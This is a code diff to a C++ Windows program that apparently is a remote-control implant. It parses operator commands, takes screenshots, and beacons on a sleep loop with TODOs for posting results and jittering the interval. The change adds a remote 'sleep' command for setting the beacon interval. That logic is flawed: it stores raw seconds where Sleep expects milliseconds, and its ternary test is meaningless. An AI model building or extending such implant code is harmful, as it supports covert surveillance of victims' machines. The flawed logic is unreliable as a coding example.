@@ -12,6 +12,8 @@
 using std::string;
 namespace fs = std::filesystem;
 
+int currentSleep = 10000;
+
 const wchar_t *ACCEPTED_MIME_TYPES[] = {
     L"text/plain", L"application/octet-stream", L"text/html",
     L"multipart/form-data", NULL};
@@ -87,6 +89,22 @@ bool runTask(string outBuffer, DWORD dwSize)
     }
     else if (cmd == "screenshot")
         screenshot();
+    else if (cmd == "sleep")
+    {
+        int seconds{};
+        try
+        {
+            seconds = std::stoi(outBuffer.substr(pipePos + 1));
+        }
+
+        catch (const std::exception &e)
+        {
+            std::cout
+                << "Error: " << e.what() << "\n";
+        }
+
+        currentSleep = seconds * 100 ? seconds : currentSleep;
+    }
 
     return true;
 }
@@ -445,8 +463,7 @@ int main(int argc, const char **argv)
             //  TODO: post results
         }
 
-        // TODO: jitter sleep interval
-        Sleep(10000);
+        Sleep(currentSleep);
     }
 
     return 0;
